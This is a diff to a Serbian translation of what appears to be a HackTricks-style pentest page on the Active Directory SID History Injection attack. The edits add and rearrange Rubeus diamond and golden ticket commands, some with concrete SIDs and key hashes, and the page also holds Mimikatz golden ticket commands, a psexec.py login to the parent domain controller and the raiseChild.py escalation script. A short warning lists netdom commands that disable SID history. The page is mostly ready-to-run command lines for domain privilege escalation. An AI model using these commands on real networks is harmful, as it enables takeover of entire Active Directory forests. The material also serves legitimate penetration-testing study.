@@ -4,7 +4,7 @@
 
 ## SID History Injection Attack
 
-Fokus **SID History Injection Attack** je pomoć **migraciji korisnika između domena** dok se obezbeđuje nastavak pristupa resursima iz prethodne domene. To se postiže **uključivanjem prethodnog Security Identifier-a (SID) korisnika u SID History** njihovog novog naloga. Važno je napomenuti da se ovaj proces može manipulisati kako bi se omogućio neovlašćen pristup dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz matične domene u SID History. Ova eksploatacija omogućava pristup svim resursima unutar matične domene.
+Fokus **SID History Injection Attack** je pomoć **migraciji korisnika između domena** dok se osigurava nastavak pristupa resursima iz prethodne domene. To se postiže **uključivanjem prethodnog sigurnosnog identifikatora (SID) korisnika u SID History** njihovog novog naloga. Važno je napomenuti da se ovaj proces može manipulisati kako bi se omogućio neovlašćen pristup dodavanjem SID-a grupe sa visokim privilegijama (kao što su Enterprise Admins ili Domain Admins) iz matične domene u SID History. Ova eksploatacija omogućava pristup svim resursima unutar matične domene.
 
 Postoje dve metode za izvršavanje ovog napada: kroz kreiranje **Golden Ticket** ili **Diamond Ticket**.
 
@@ -13,10 +13,38 @@ Da bi se odredio SID za grupu **"Enterprise Admins"**, prvo je potrebno locirati
 Takođe možete koristiti grupe **Domain Admins**, koje se završavaju sa **512**.
 
 Drugi način da se pronađe SID grupe iz druge domene (na primer "Domain Admins") je sa:
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-### Zlatna ulaznica (Mimikatz) sa KRBTGT-AES256
+> [!WARNING]
+> Imajte na umu da je moguće onemogućiti SID istoriju u odnosu poverenja, što će učiniti ovaj napad neuspešnim.
+
+Prema [**docs**](https://technet.microsoft.com/library/cc835085.aspx):
+- **Onemogućavanje SIDHistory na šumskim poverenjima** korišćenjem netdom alata (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- **Primena SID Filter Quarantining na spoljnim poverenjima** korišćenjem netdom alata (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Primena SID filtriranja na domena poverenja unutar jedne šume** se ne preporučuje jer je to nepodržana konfiguracija i može izazvati prekidne promene. Ako je domena unutar šume nepouzdana, ne bi trebala biti član šume. U ovoj situaciji je neophodno prvo podeliti poverljive i nepouzdane domene u odvojene šume gde se može primeniti SID filtriranje na međušumskom poverenju.
+
+Proverite ovaj post za više informacija o zaobilaženju ovoga: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### Diamond Ticket (Rubeus + KRBTGT-AES256)
+
+Poslednji put kada sam ovo probao, morao sam da dodam arg **`/ldap`**.
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
+```
+### Golden Ticket (Mimikatz) sa KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -33,22 +61,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Za više informacija o zlatnim karticama proverite:
+Za više informacija o zlatnim kartama proverite:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### Dijamantska karta (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
 Za više informacija o dijamantskim kartama proverite:
 
 {{#ref}}
@@ -99,12 +118,12 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatski koristeći [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
 Ovo je Impacket skripta koja će **automatizovati eskalaciju sa child na parent domen**. Skripta zahteva:
 
 - Ciljni kontroler domena
-- Akreditive za admin korisnika u child domenu
+- Kredencijale za admin korisnika u child domenu
 
 Tok rada je:
 
@@ -112,8 +131,8 @@ Tok rada je:
 - Preuzima hash za KRBTGT nalog u child domenu
 - Kreira Zlatnu Ulaznicu
 - Prijavljuje se u parent domen
-- Preuzima akreditive za Administrator nalog u parent domenu
-- Ako je `target-exec` prekidač specificiran, autentifikuje se na Kontroler Domena parent domena putem Psexec.
+- Preuzima kredencijale za Administrator nalog u parent domenu
+- Ako je `target-exec` prekidač specificiran, autentifikuje se na Kontroler Domenа parent domena putem Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
